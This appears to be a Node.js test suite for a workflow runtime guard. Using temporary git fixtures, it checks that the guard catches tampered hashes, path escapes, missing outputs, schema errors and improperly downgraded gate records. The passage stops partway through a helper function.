import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';
import {
  appendFileSync,
  existsSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  readdirSync,
  rmSync,
  renameSync,
  symlinkSync,
  writeFileSync,
} from 'node:fs';
import { hostname, tmpdir } from 'node:os';
import { dirname, join, resolve } from 'node:path';
import { spawnSync } from 'node:child_process';
import test from 'node:test';
import { fileURLToPath } from 'node:url';

const ROOT = resolve(dirname(fileURLToPath(import.meta.url)), '..');
const GUARD = join(ROOT, 'scripts', 'runtime-guard.mjs');
const WORKFLOW_ID = 'WF-00000000-0000-0000-0000-000000000001';
const TASK_ID = 'TASK-00000000-0000-0000-0000-000000000001';
const RUN_ID = 'RUN-00000000-0000-0000-0000-000000000001';
const TASK_ID_2 = 'TASK-00000000-0000-0000-0000-000000000002';
const RUN_ID_2 = 'RUN-00000000-0000-0000-0000-000000000002';
const ZERO_HASH = '0'.repeat(64);
const FIRST_EVENT_HASH = 'd42a3dbcacd494ced033f30a4818ca3a4941f8e76e44ce459782ef534dbe15e8';
const NUMERIC_KEY_CANONICAL = '{"actor":"manager-agent","candidate_commit":null,"event_id":"EVT-00000000-0000-0000-0000-000000000001","event_type":"WORKFLOW_CREATED","from_phase":null,"from_status":null,"payload":{"10":"ten","2":"two","nested":{"10":"nested-ten","2":"nested-two"}},"previous_event_hash":"0000000000000000000000000000000000000000000000000000000000000000","run_id":null,"schema_version":1,"seq":1,"state_revision":1,"task_id":null,"task_status_after":null,"task_status_before":null,"timestamp":"2026-07-29T00:00:00Z","to_phase":"INTAKE","to_status":"CREATED","workflow_id":"WF-00000000-0000-0000-0000-000000000001"}';
const NUMERIC_KEY_EVENT_HASH = '518202028b4743c8422327055a6a3812324648ca634edb67f4adf72e382b5da9';
const APPROVAL_TRIGGERS = [
  'REQUIREMENT_AMBIGUITY', 'IMPLEMENTATION_TRADEOFF', 'PUBLIC_API_BREAKING_CHANGE',
  'IRREVERSIBLE_DATA_OP', 'NEEDS_INSTALL_OR_NETWORK', 'NEEDS_CREDENTIALS',
  'INPUT_NOT_GIT_REPO', 'INPUT_DIRTY_WORKTREE', 'CHANGE_APPROVED_REQ_OR_ARCH',
  'THIRDPARTY_LICENSE_UNCLEAR', 'SECURITY_RISK_ACCEPTANCE', 'TEST_OR_SECURITY_EXCEPTION',
  'RELEASE_HOLD_OVERRIDE', 'MAX_REWORK_EXCEEDED', 'DESTRUCTIVE_OR_CROSS_PROJECT',
];

function runGuard(args, { env = {} } = {}) {
  return spawnSync(process.execPath, [GUARD, ...args], {
    cwd: ROOT,
    encoding: 'utf8',
    env: { ...process.env, ...env },
  });
}

function writeJson(path, value) {
  mkdirSync(dirname(path), { recursive: true });
  writeFileSync(path, `${JSON.stringify(value, null, 2)}\n`, 'utf8');
}

function canonicalize(value) {
  if (Array.isArray(value)) return value.map(canonicalize);
  if (value && typeof value === 'object') {
    return Object.fromEntries(
      Object.keys(value)
        .sort()
        .map((key) => [key, canonicalize(value[key])]),
    );
  }
  return value;
}

function compareUnicodeCodePoints(left, right) {
  const leftPoints = Array.from(left, (character) => character.codePointAt(0));
  const rightPoints = Array.from(right, (character) => character.codePointAt(0));
  const length = Math.min(leftPoints.length, rightPoints.length);
  for (let index = 0; index < length; index += 1) {
    if (leftPoints[index] !== rightPoints[index]) return leftPoints[index] - rightPoints[index];
  }
  return leftPoints.length - rightPoints.length;
}

function canonicalizeCodePoints(value) {
  if (Array.isArray(value)) return value.map(canonicalizeCodePoints);
  if (value && typeof value === 'object') {
    return Object.fromEntries(
      Object.keys(value)
        .sort(compareUnicodeCodePoints)
        .map((key) => [key, canonicalizeCodePoints(value[key])]),
    );
  }
  return value;
}

function signedEvent(fields) {
  const unsigned = {
    schema_version: 1,
    seq: fields.seq,
    state_revision: fields.seq,
    event_id: `EVT-00000000-0000-0000-0000-${String(fields.seq).padStart(12, '0')}`,
    timestamp: `2026-07-29T00:00:${String(fields.seq - 1).padStart(2, '0')}Z`,
    workflow_id: WORKFLOW_ID,
    task_id: fields.task_id ?? null,
    run_id: fields.run_id ?? null,
    actor: 'manager-agent',
    event_type: fields.event_type,
    from_status: fields.from_status ?? null,
    to_status: fields.to_status,
    from_phase: fields.from_phase ?? null,
    to_phase: fields.to_phase,
    task_status_before: fields.task_status_before ?? null,
    task_status_after: fields.task_status_after ?? null,
    candidate_commit: fields.candidate_commit ?? null,
    previous_event_hash: fields.previous_event_hash ?? ZERO_HASH,
    payload: fields.payload ?? {},
  };
  const canonical = JSON.stringify(canonicalize(unsigned));
  return {
    ...unsigned,
    event_hash: createHash('sha256').update(canonical, 'utf8').digest('hex'),
  };
}

function makeRuntime({
  status = 'CREATED',
  phase = 'INTAKE',
  revision = 1,
  events,
  taskIds = [],
  pendingDecisionIds = [],
  withCurrentCandidate = false,
} = {}) {
  const root = mkdtempSync(join(tmpdir(), 'openclaw-runtime-guard-'));
  const runtimeRoot = join(root, 'runtime');
  const targetRoot = join(root, 'target');
  const workflowDir = join(runtimeRoot, 'control', 'workflows', WORKFLOW_ID);
  mkdirSync(targetRoot, { recursive: true });
  const git = (args) => {
    const result = spawnSync('git', args, { encoding: 'utf8' });
    assert.equal(result.status, 0, result.stderr);
    return result.stdout.trim();
  };
  git(['init', '-q', targetRoot]);
  writeFileSync(join(targetRoot, 'README.md'), 'fixture\n', 'utf8');
  git(['-C', targetRoot, 'add', 'README.md']);
  git(['-C', targetRoot, '-c', 'user.name=Runtime Guard Test', '-c', 'user.email=guard@example.test', 'commit', '-qm', 'fixture']);
  git(['-C', targetRoot, 'branch', '-M', `sdlc/${WORKFLOW_ID}/integration`]);
  const currentCandidateCommit = withCurrentCandidate
    ? git(['-C', targetRoot, 'rev-parse', 'HEAD'])
    : null;
  mkdirSync(join(workflowDir, 'tasks'), { recursive: true });
  mkdirSync(join(workflowDir, 'decisions'), { recursive: true });
  mkdirSync(join(workflowDir, 'gates'), { recursive: true });
  mkdirSync(join(workflowDir, 'approval-assessments'), { recursive: true });
  mkdirSync(join(runtimeRoot, 'artifacts'), { recursive: true });
  mkdirSync(join(runtimeRoot, 'worktrees'), { recursive: true });
  const rulesSnapshot = 'rules snapshot\n';
  const contextSummary = 'context summary\n';
  writeFileSync(join(workflowDir, 'rules-snapshot.md'), rulesSnapshot, 'utf8');
  writeFileSync(join(workflowDir, 'context-summary.md'), contextSummary, 'utf8');

  const workflow = {
    schema_version: 1,
    workflow_id: WORKFLOW_ID,
    status,
    status_reason: 'test fixture',
    target_project_root_abs: targetRoot,
    runtime_root_abs: runtimeRoot,
    integration_branch: `sdlc/${WORKFLOW_ID}/integration`,
    base_commit: 'a'.repeat(40),
    current_candidate_commit: currentCandidateCommit,
    current_phase: phase,
    state_revision: revision,
    task_ids: taskIds,
    pending_decision_ids: pendingDecisionIds,
    context_version: 0,
    rules_version: 'test-rules-v1',
    rules_snapshot_sha256: createHash('sha256').update(rulesSnapshot, 'utf8').digest('hex'),
    context_summary_sha256: createHash('sha256').update(contextSummary, 'utf8').digest('hex'),
    created_at: '2026-07-29T00:00:00Z',
    updated_at: `2026-07-29T00:00:0${revision - 1}Z`,
  };
  writeJson(join(workflowDir, 'workflow.json'), workflow);
  writeJson(join(runtimeRoot, 'control', 'active-workflows.json'), {
    schema_version: 1,
    workflows: [
      {
        workflow_id: WORKFLOW_ID,
        status,
        current_phase: phase,
        current_candidate_commit: currentCandidateCommit,
        state_revision: revision,
        updated_at: workflow.updated_at,
        workflow_json_abs: join(workflowDir, 'workflow.json'),
      },
    ],
  });

  const actualEvents = events ?? [
    signedEvent({
      seq: 1,
      event_type: 'WORKFLOW_CREATED',
      to_status: status,
      to_phase: phase,
      candidate_commit: currentCandidateCommit,
    }),
  ];
  writeFileSync(
    join(workflowDir, 'events.jsonl'),
    `${actualEvents.map((event) => JSON.stringify(event)).join('\n')}\n`,
    'utf8',
  );
  writeApprovalAssessment(fixtureLike(runtimeRoot, workflowDir), { scope: 'INTAKE' });

  return {
    root,
    runtimeRoot,
    targetRoot,
    workflowDir,
    workflow,
    currentCandidateCommit,
    cleanup: () => rmSync(root, { recursive: true, force: true }),
  };
}

function checkWorkflow(fixture) {
  return runGuard([
    'check-workflow',
    '--project-root', ROOT,
    '--runtime-root', fixture.runtimeRoot,
    '--workflow-id', WORKFLOW_ID,
  ]);
}

function recoveryCheck(fixture, workflowId = null) {
  const args = ['recovery-check', '--project-root', ROOT, '--runtime-root', fixture.runtimeRoot];
  if (workflowId) args.push('--workflow-id', workflowId);
  return runGuard(args);
}

function prepareWorkflowTransition(fixture) {
  const eventPath = join(fixture.root, 'transition-event.json');
  const workflowPath = join(fixture.root, 'next-workflow.json');
  const activePath = join(fixture.root, 'next-active.json');
  const timestamp = '2026-07-29T00:00:01Z';
  const nextWorkflow = {
    ...fixture.workflow,
    status: 'ANALYZING_REQUIREMENTS',
    status_reason: 'requirements analysis started',
    current_phase: 'REQUIREMENTS',
    state_revision: 2,
    updated_at: timestamp,
  };
  const nextActive = JSON.parse(readFileSync(join(fixture.runtimeRoot, 'control', 'active-workflows.json'), 'utf8'));
  Object.assign(nextActive.workflows[0], {
    status: nextWorkflow.status,
    current_phase: nextWorkflow.current_phase,
    current_candidate_commit: nextWorkflow.current_candidate_commit,
    state_revision: nextWorkflow.state_revision,
    updated_at: nextWorkflow.updated_at,
  });
  writeJson(eventPath, {
    event_id: 'EVT-00000000-0000-0000-0000-000000000002',
    timestamp,
    workflow_id: WORKFLOW_ID,
    task_id: null,
    run_id: null,
    actor: 'manager-agent',
    event_type: 'PHASE_ADVANCED',
    from_status: 'CREATED',
    to_status: nextWorkflow.status,
    from_phase: 'INTAKE',
    to_phase: nextWorkflow.current_phase,
    task_status_before: null,
    task_status_after: null,
    candidate_commit: null,
    payload: {},
  });
  writeJson(workflowPath, nextWorkflow);
  writeJson(activePath, nextActive);
  return {
    eventPath,
    workflowPath,
    activePath,
    nextWorkflow,
    args: [
      'commit-transition',
      '--project-root', ROOT,
      '--runtime-root', fixture.runtimeRoot,
      '--workflow-id', WORKFLOW_ID,
      '--event', eventPath,
      '--next-workflow', workflowPath,
      '--next-active', activePath,
      '--expected-revision', '1',
    ],
  };
}

function prepareDispatchArgs(fixture, task, sessionKey = `session-key:${task.task_id}:${task.run_id}`) {
  return [
    'prepare-dispatch', '--project-root', ROOT, '--runtime-root', fixture.runtimeRoot,
    '--workflow-id', WORKFLOW_ID, '--task-id', task.task_id, '--run-id', task.run_id,
    '--task-file', join(fixture.workflowDir, 'tasks', `${task.task_id}.json`),
    '--agent-id', task.assigned_agent, '--attempt', String(task.attempt), '--session-key', sessionKey,
  ];
}

function checkTaskPackage(fixture, task) {
  return runGuard([
    'check-task-package',
    '--project-root', ROOT,
    '--runtime-root', fixture.runtimeRoot,
    '--workflow-id', WORKFLOW_ID,
    '--task-id', task.task_id,
    '--task-file', join(fixture.workflowDir, 'tasks', `${task.task_id}.json`),
  ]);
}

function fixtureLike(runtimeRoot, workflowDir) {
  return { runtimeRoot, workflowDir };
}

function writeApprovalAssessment(fixture, {
  scope,
  task = null,
  required = [],
} = {}) {
  const evaluations = APPROVAL_TRIGGERS.map((trigger) => ({
    trigger,
    status: required.some((item) => item.trigger === trigger) ? 'REQUIRES_APPROVAL' : 'NOT_TRIGGERED',
    rationale: 'fixture assessment',
    decision_id: required.find((item) => item.trigger === trigger)?.decision_id ?? null,
  }));
  const suffix = scope === 'TASK' ? task.task_id : scope.toLowerCase();
  writeJson(join(fixture.workflowDir, 'approval-assessments', `${suffix}.json`), {
    schema_version: 1,
    workflow_id: WORKFLOW_ID,
    scope,
    task_id: task?.task_id ?? null,
    run_id: task?.run_id ?? null,
    assessed_at: '2026-07-29T00:00:00Z',
    evaluations,
  });
}

test('check-workflow reports a legacy snapshot as structured schema errors', () => {
  const fixture = makeRuntime();
  try {
    writeJson(join(fixture.workflowDir, 'workflow.json'), {
      schema_version: '1.0',
      workflow_id: WORKFLOW_ID,
      status: 'DESIGNING',
      tasks: [],
    });
    const result = checkWorkflow(fixture);
    assert.equal(result.status, 1);
    assert.match(result.stdout, /SCHEMA_(REQUIRED|TYPE|CONST)/);
    assert.doesNotMatch(result.stdout, /GUARD_USAGE_ERROR/);
  } finally { fixture.cleanup(); }
});

test('recovery-check selects the sole active workflow and runs the full guard', () => {
  const fixture = makeRuntime();
  try {
    const result = recoveryCheck(fixture);
    assert.equal(result.status, 0, result.stdout);
    assert.match(result.stdout, /"command": "recovery-check"/);
  } finally { fixture.cleanup(); }
});

test('check-workflow rejects an artifact run without a control task', () => {
  const fixture = makeRuntime();
  try {
    mkdirSync(join(fixture.runtimeRoot, 'artifacts', WORKFLOW_ID, TASK_ID, RUN_ID), { recursive: true });
    const result = checkWorkflow(fixture);
    assert.equal(result.status, 1);
    assert.match(result.stdout, /ORPHAN_ARTIFACT_RUN/);
  } finally { fixture.cleanup(); }
});

test('check-workflow requires both completed-task summaries', () => {
  const fixture = makeRuntime({ taskIds: [TASK_ID], withCurrentCandidate: true });
  try {
    const task = scopedTask(fixture);
    appendTaskLifecycle(fixture, task);
    writeTaskResult(task);
    rmSync(join(task.artifact_root_abs, 'output', 'manager-summary.md'));
    const result = checkWorkflow(fixture);
    assert.equal(result.status, 1);
    assert.match(result.stdout, /TASK_SUMMARY_REQUIRED/);
  } finally { fixture.cleanup(); }
});

test('check-workflow detects a tampered context input hash', () => {
  const fixture = makeRuntime({ taskIds: [TASK_ID], withCurrentCandidate: true });
  try {
    const task = scopedTask(fixture);
    appendTaskLifecycle(fixture, task);
    writeTaskResult(task);
    writeFileSync(join(task.artifact_root_abs, 'input', 'rules.md'), 'tampered rules\n', 'utf8');
    const result = checkWorkflow(fixture);
    assert.equal(result.status, 1);
    assert.match(result.stdout, /CONTEXT_INPUT_HASH_MISMATCH/);
    assert.match(result.stdout, /RULE_HASH_MISMATCH/);
  } finally { fixture.cleanup(); }
});

test('check-task-package validates a complete package before its dispatch event', () => {
  const fixture = makeRuntime({ taskIds: [TASK_ID], withCurrentCandidate: true });
  try {
    const task = scopedTask(fixture, { status: 'READY' });
    const result = checkTaskPackage(fixture, task);
    assert.equal(result.status, 0, result.stdout);
    assert.match(result.stdout, /"command": "check-task-package"/);
  } finally { fixture.cleanup(); }
});

test('check-task-package rejects a new task that omits output contract version', () => {
  const fixture = makeRuntime({ taskIds: [TASK_ID], withCurrentCandidate: true });
  try {
    const task = scopedTask(fixture, { status: 'READY' });
    delete task.output_contract_version;
    writeJson(join(fixture.workflowDir, 'tasks', `${task.task_id}.json`), task);
    writeTaskContext(task);
    const result = checkTaskPackage(fixture, task);
    assert.equal(result.status, 1);
    assert.match(result.stdout, /TASK_OUTPUT_CONTRACT_VERSION_REQUIRED/);
  } finally { fixture.cleanup(); }
});

test('check-task-package rejects a new task missing a default structured output declaration', () => {
  const fixture = makeRuntime({ taskIds: [TASK_ID], withCurrentCandidate: true });
  try {
    const task = scopedTask(fixture, { status: 'READY' });
    task.structured_outputs = task.structured_outputs.filter((entry) => !entry.path_abs.endsWith('command-records.jsonl'));
    writeJson(join(fixture.workflowDir, 'tasks', `${task.task_id}.json`), task);
    writeTaskContext(task);
    const result = checkTaskPackage(fixture, task);
    assert.equal(result.status, 1);
    assert.match(result.stdout, /TASK_OUTPUT_CONTRACT_MISSING/);
  } finally { fixture.cleanup(); }
});

test('check-task-package rejects a noncanonical worktree before dispatch', () => {
  const fixture = makeRuntime({ taskIds: [TASK_ID], withCurrentCandidate: true });
  try {
    const task = scopedTask(fixture);
    const escaped = join(fixture.runtimeRoot, 'worktrees', WORKFLOW_ID, task.task_id, task.run_id, 'other-repo');
    mkdirSync(escaped, { recursive: true });
    task.worktree_path_abs = escaped;
    writeJson(join(fixture.workflowDir, 'tasks', `${task.task_id}.json`), task);
    const result = checkTaskPackage(fixture, task);
    assert.equal(result.status, 1);
    assert.match(result.stdout, /WORKTREE_PATH_ESCAPE/);
  } finally { fixture.cleanup(); }
});

test('check-task-package reports malformed task schema without a usage error', () => {
  const fixture = makeRuntime({ taskIds: [TASK_ID], withCurrentCandidate: true });
  try {
    const task = scopedTask(fixture);
    delete task.artifact_root_abs;
    writeJson(join(fixture.workflowDir, 'tasks', `${task.task_id}.json`), task);
    const result = checkTaskPackage(fixture, task);
    assert.equal(result.status, 1);
    assert.match(result.stdout, /SCHEMA_REQUIRED/);
    assert.doesNotMatch(result.stdout, /GUARD_USAGE_ERROR/);
  } finally { fixture.cleanup(); }
});

test('check-workflow requires every declared structured output for a completed task', () => {
  const fixture = makeRuntime({ taskIds: [TASK_ID], withCurrentCandidate: true });
  try {
    const task = scopedTask(fixture);
    appendTaskLifecycle(fixture, task);
    writeTaskResult(task);
    task.structured_outputs.push({
      path_abs: join(task.artifact_root_abs, 'output', 'requirement-extra.json'),
      schema_path_abs: join(ROOT, 'contracts', 'acceptance-criteria.schema.json'),
      format: 'json',
      required: true,
      producer: 'review-agent',
    });
    writeJson(join(fixture.workflowDir, 'tasks', `${task.task_id}.json`), task);
    const result = checkWorkflow(fixture);
    assert.equal(result.status, 1);
    assert.match(result.stdout, /STRUCTURED_OUTPUT_REQUIRED/);
  } finally { fixture.cleanup(); }
});

test('check-workflow rejects legacy developer result fields even when a DevelopmentGate tries to downgrade them', () => {
  const fixture = makeRuntime({ taskIds: [TASK_ID], withCurrentCandidate: true });
  try {
    const task = scopedTask(fixture);
    appendTaskLifecycle(fixture, task);
    writeTaskResult(task);
    const resultPath = join(task.artifact_root_abs, 'output', 'result.json');
    const resultJson = JSON.parse(readFileSync(resultPath, 'utf8'));
    resultJson.claims = [{ id: 'CL-001', level: 'OBSERVED', statement: 'legacy claim fields' }];
    resultJson.self_validation = { preflight_1_manifest: 'PASS' };
    resultJson.unresolved_issues = [{ id: 'UI-001', description: 'legacy issue object' }];
    resultJson.isolation_mode = 'worktree';
    writeJson(resultPath, resultJson);
    writeTaskEvidence(task, ['EVD-development-result']);
    writeJson(join(fixture.workflowDir, 'gates', 'development.json'), {
      schema_version: 1,
      gate_id: 'GATE-DEVELOPMENT-001',
      gate_name: 'DevelopmentGate',
      workflow_id: WORKFLOW_ID,
      task_id: task.task_id,
      checklist_version: 'gate-checklists v1',
      evaluated_at: '2026-07-29T00:00:30Z',
      items: [{
        item_id: 'DEV-0',
        description: 'result JSON contract incorrectly downgraded',
        status: 'UNKNOWN',
        blocking: false,
        evidence_refs: ['EVD-development-result'],
        notes: 'must not be accepted',
      }],
      evidence_refs: ['EVD-development-result'],
      approved_decision_ids: [],
      overall: 'PASS',
      overall_reason: 'incorrectly treats schema errors as non-blocking',
    });
    const result = checkWorkflow(fixture);
    assert.equal(result.status, 1);
    assert.match(result.stdout, /SCHEMA_REQUIRED/);
    assert.match(result.stdout, /SCHEMA_TYPE/);
    assert.match(result.stdout, /SCHEMA_ENUM/);
    assert.match(result.stdout, /DEVELOPMENT_RESULT_CONTRACT_ITEM_NOT_BLOCKING/);
    assert.match(result.stdout, /DEVELOPMENT_RESULT_CONTRACT_NOT_VALID/);
  } finally { fixture.cleanup(); }
});

test('check-workflow requires DEV-0 on every task-bound DevelopmentGate', () => {
  const fixture = makeRuntime({ taskIds: [TASK_ID], withCurrentCandidate: true });
  try {
    const task = scopedTask(fixture);
    appendTaskLifecycle(fixture, task);
    writeTaskResult(task);
    writeTaskEvidence(task, ['EVD-development-gate']);
    writeJson(join(fixture.workflowDir, 'gates', 'development.json'), {
      schema_version: 1,
      gate_id: 'GATE-DEVELOPMENT-002',
      gate_name: 'DevelopmentGate',
      workflow_id: WORKFLOW_ID,
      task_id: task.task_id,
      checklist_version: 'gate-checklists v1',
      evaluated_at: '2026-07-29T00:00:30Z',
      items: [{
        item_id: 'DEV-1',
        description: 'an unrelated development check',
        status: 'PASS',
        blocking: true,
        evidence_refs: ['EVD-development-gate'],
        notes: 'verified',
      }],
      evidence_refs: ['EVD-development-gate'],
      approved_decision_ids: [],
      overall: 'PASS',
      overall_reason: 'incorrectly omits result contract validation',
    });
    const result = checkWorkflow(fixture);
    assert.equal(result.status, 1);
    assert.match(result.stdout, /DEVELOPMENT_RESULT_CONTRACT_ITEM_REQUIRED/);
  } finally { fixture.cleanup(); }
});

test('check-workflow requires an intake approval assessment', () => {
  const fixture = makeRuntime();
  try {
    rmSync(join(fixture.workflowDir, 'approval-assessments', 'intake.json'));
    const result = checkWorkflow(fixture);
    assert.equal(result.status, 1);
    assert.match(result.stdout, /INTAKE_APPROVAL_ASSESSMENT_REQUIRED/);
  } finally { fixture.cleanup(); }
});

function clearActiveWorkflows(fixture) {
  writeJson(join(fixture.runtimeRoot, 'control', 'active-workflows.json'), {
    schema_version: 1,
    workflows: [],
  });
}

function minimalTask(fixture, overrides = {}) {
  const taskId = overrides.task_id ?? TASK_ID;
  const runId = overrides.run_id ?? RUN_ID;
  const artifactRoot = join(fixture.runtimeRoot, 'artifacts', WORKFLOW_ID, taskId, runId);
  const task = {
    schema_version: 1,
    workflow_id: WORKFLOW_ID,
    task_id: taskId,
    run_id: runId,
    parent_task_id: null,
    task_type: 'CODE_REVIEW',
    assigned_agent: 'review-agent',
    title: 'review candidate',
    description: 'test task',
    status: 'COMPLETED',
    dependencies: [],
    acceptance_criteria_ids: [],
    attempt: 1,
    max_attempts: 3,
    input_commit: 'b'.repeat(40),
    expected_branch: null,
    worktree_path_abs: fixture.targetRoot,
    artifact_root_abs: artifactRoot,
    context_manifest_path_abs: join(artifactRoot, 'input', 'context-manifest.json'),
    allowed_write_paths_abs: [],
    forbidden_paths_abs: [],
    required_outputs: [],
    structured_outputs: [
      {
        path_abs: join(artifactRoot, 'output', 'result.json'),
        schema_path_abs: join(ROOT, 'contracts', 'result.schema.json'),
        format: 'json',
        required: true,
        producer: overrides.assigned_agent ?? 'review-agent',
      },
      {
        path_abs: join(artifactRoot, 'output', 'evidence.jsonl'),
        schema_path_abs: join(ROOT, 'contracts', 'evidence.schema.json'),
        format: 'jsonl',
        required: false,
        producer: overrides.assigned_agent ?? 'review-agent',
      },
      {
        path_abs: join(artifactRoot, 'output', 'command-records.jsonl'),
        schema_path_abs: join(ROOT, 'contracts', 'command-record.schema.json'),
        format: 'jsonl',
        required: false,
        producer: overrides.assigned_agent ?? 'review-agent',
      },
    ],
    approval_dependencies: [],
    created_at: '2026-07-29T00:00:00Z',
    updated_at: '2026-07-29T00:00:01Z',
    ...overrides,
  };
  writeJson(join(fixture.workflowDir, 'tasks', `${task.task_id}.json`), task);
  return task;
}

function appendTaskLifecycle(fixture, task, finalStatus = task.status) {
  const statusPath = ['CREATED', 'READY', 'DISPATCHED', 'RUNNING', 'COMPLETED'];
  const finalIndex = statusPath.indexOf(finalStatus);
  assert.ok(finalIndex > 0, `unsupported fixture task status: ${finalStatus}`);
  const eventsPath = join(fixture.workflowDir, 'events.jsonl');
  const events = readFileSync(eventsPath, 'utf8')
    .trim()
    .split(/\r?\n/u)
    .filter(Boolean)
    .map((line) => JSON.parse(line));
  for (let index = 0; index < finalIndex; index += 1) {
    const previous = events.at(-1);
    const after = statusPath[index + 1];
    events.push(signedEvent({
      seq: events.length + 1,
      event_type: `TASK_${after}`,
      from_status: previous.to_status,
      to_status: previous.to_status,
      from_phase: previous.to_phase,
      to_phase: previous.to_phase,
      task_id: task.task_id,
      run_id: task.run_id,
      task_status_before: statusPath[index],
      task_status_after: after,
      candidate_commit: fixture.currentCandidateCommit,
      previous_event_hash: previous.event_hash,
    }));
  }
  writeFileSync(eventsPath, `${events.map((event) => JSON.stringify(event)).join('\n')}\n`, 'utf8');
  const latest = events.at(-1);
  fixture.workflow.state_revision = latest.seq;
  fixture.workflow.updated_at = latest.timestamp;
  writeJson(join(fixture.workflowDir, 'workflow.json'), fixture.workflow);
  const activePath = join(fixture.runtimeRoot, 'control', 'active-workflows.json');
  const active = JSON.parse(readFileSync(activePath, 'utf8'));
  const entry = active.workflows.find((candidate) => candidate.workflow_id === WORKFLOW_ID);
  if (entry) {
    entry.state_revision = latest.seq;
    entry.updated_at = latest.timestamp;
  }
  writeJson(activePath, active);
  return latest.seq;
}

function scopedTask(fixture, overrides = {}) {
  const taskId = overrides.task_id ?? TASK_ID;
  const runId = overrides.run_id ?? RUN_ID;
  const artifactRoot = join(fixture.runtimeRoot, 'artifacts', WORKFLOW_ID, taskId, runId);
  const worktree = join(fixture.runtimeRoot, 'worktrees', WORKFLOW_ID, taskId, runId, 'repo');
  mkdirSync(join(artifactRoot, 'output'), { recursive: true });
  mkdirSync(worktree, { recursive: true });
  const task = minimalTask(fixture, {
    status: 'COMPLETED',
    input_commit: fixture.currentCandidateCommit,
    worktree_path_abs: worktree,
    artifact_root_abs: artifactRoot,
    context_manifest_path_abs: join(artifactRoot, 'input', 'context-manifest.json'),
    ...overrides,
  });
  if (task.status === 'READY') declareDefaultOutputContract(task);
  writeTaskContext(task);
  // The task package command reads the control-plane snapshot, while the
  // context manifest carries an immutable copy.  Keep both fixtures aligned.
  writeJson(join(fixture.workflowDir, 'tasks', `${task.task_id}.json`), task);
  writeApprovalAssessment(fixture, { scope: 'TASK', task });
  return task;
}

function declareDefaultOutputContract(task) {
  const outputRoot = join(task.artifact_root_abs, 'output');
  task.output_contract_version = 1;
  task.structured_outputs = [
    { path_abs: join(outputRoot, 'result.json'), schema_path_abs: join(ROOT, 'contracts', 'result.schema.json'), format: 'json' },
    { path_abs: join(outputRoot, 'evidence.jsonl'), schema_path_abs: join(ROOT, 'contracts', 'evidence.schema.json'), format: 'jsonl' },
    { path_abs: join(outputRoot, 'command-records.jsonl'), schema_path_abs: join(ROOT, 'contracts', 'command-record.schema.json'), format: 'jsonl' },
  ].map((entry) => ({ ...entry, required: true, producer: task.assigned_agent }));
}

function writeTaskContext(task) {
  const inputRoot = join(task.artifact_root_abs, 'input');
  mkdirSync(inputRoot, { recursive: true });
  writeJson(join(inputRoot, 'task.json'), task);
  writeFileSync(join(inputRoot, 'context.md'), 'context\n', 'utf8');
  writeFileSync(join(inputRoot, 'rules.md'), 'rules\n', 'utf8');
  writeJson(join(inputRoot, 'acceptance-criteria.json'), { schema_version: 1, criteria: [] });
  writeJson(join(inputRoot, 'approved-decisions.json'), { decisions: [] });
  writeJson(join(inputRoot, 'source-manifest.json'), { files: [] });
  const inputFiles = ['task.json', 'context.md', 'rules.md', 'acceptance-criteria.json', 'approved-decisions.json', 'source-manifest.json']
    .map((name) => {
      const path = join(inputRoot, name);
      return { path_abs: path, sha256: createHash('sha256').update(readFileSync(path)).digest('hex') };
    });
  writeJson(join(inputRoot, 'context-manifest.json'), {
    schema_version: 1,
    workflow_id: task.workflow_id,
    task_id: task.task_id,
    run_id: task.run_id,
    assigned_agent: task.assigned_agent,
    created_at: task.created_at,
    manager_session_reference: null,
    target_project_root_abs: task.worktree_path_abs,
    worktree_path_abs: task.worktree_path_abs,
    artifact_root_abs: task.artifact_root_abs,
    input_files: inputFiles,
    rule_version: 'test-rules-v1',
    rule_hash: inputFiles.find((entry) => entry.path_abs.endsWith('rules.md')).sha256,
    input_commit: task.input_commit,
    expected_output_paths_abs: [],
  });
}

function writeTaskResult(task) {
  writeJson(join(task.artifact_root_abs, 'output', 'result.json'), {
    schema_version: 1,
    workflow_id: task.workflow_id,
    task_id: task.task_id,
    run_id: task.run_id,
    agent_id: task.assigned_agent,
    role: task.task_type.toLowerCase(),
    attempt: task.attempt,
    started_at: '2026-07-29T00:00:00Z',
    finished_at: '2026-07-29T00:00:01Z',
    result_status: 'COMPLETED',
    summary_for_user: 'task complete',
    summary_for_manager: 'task complete',
    input_commit: task.input_commit,
    output_commit: null,
    branch: null,
    worktree_path_abs: task.worktree_path_abs,
    artifact_root_abs: task.artifact_root_abs,
    command_record_refs: [],
    evidence_refs: [],
    claims: [],
    isolation_mode: 'UNSANDBOXED_LOCAL',
    self_validation: { preflight_passed: true, checks: [] },
  });
  writeFileSync(join(task.artifact_root_abs, 'output', 'user-summary.md'), 'task complete\n', 'utf8');
  writeFileSync(join(task.artifact_root_abs, 'output', 'manager-summary.md'), 'task complete\n', 'utf8');
}

function writeTaskEvidence(task, evidenceIds) {
  writeFileSync(
    join(task.artifact_root_abs, 'output', 'evidence.jsonl'),
    `${evidenceIds.map((evidenceId) => JSON.stringify({
      evidence_id: evidenceId,
      source_type: 'file',
      locator_abs: join(task.artifact_root_abs, 'output', 'result.json'),
      collected_at: '2026-07-29T00:00:01Z',
      collector: task.assigned_agent,
    })).join('\n')}\n`,
    'utf8',
  );
}

function writeReviewFindings(task, overrides = {}) {
  writeJson(join(task.artifact_root_abs, 'output', 'review-findings.json'), {
    schema_version: 1,
    workflow_id: task.workflow_id,
    task_id: task.task_id,
    reviewed_commit: task.input_commit,
    review_scope: 'PRODUCTION_CODE',
    verdict: 'APPROVE',
    findings: [],
    ...overrides,
  });
}

function reviewFinding(overrides = {}) {
  return {
    finding_id: 'FIND-lineage',
    severity: 'HIGH',
    category: 'correctness',
    title: 'authoritative finding',
    description: 'candidate behavior requires review',
    file: 'src/example.js',
    line: 1,
    commit: null,
    evidence: [],
    remediation: 'address and re-review',
    blocking: true,
    status: 'OPEN',
    ...overrides,
  };
}

function writePassGate(fixture, { taskId = null, evidenceId, gateName = 'SecurityGate' }) {
  writeJson(join(fixture.workflowDir, 'gates', `${gateName}.json`), {
    schema_version: 1,
    gate_id: `GATE-${gateName}`,
    gate_name: gateName,
    workflow_id: WORKFLOW_ID,
    task_id: taskId,
    checklist_version: 'gate-checklists v1',
    evaluated_at: '2026-07-29T00:00:30Z',
    items: [{
      item_id: `${gateName}-1`,
      description: 'authoritative evidence is complete',
      status: 'PASS',
      blocking: true,
      evidence_refs: [evidenceId],
      notes: 'verified',
    }],
    evidence_refs: [evidenceId],
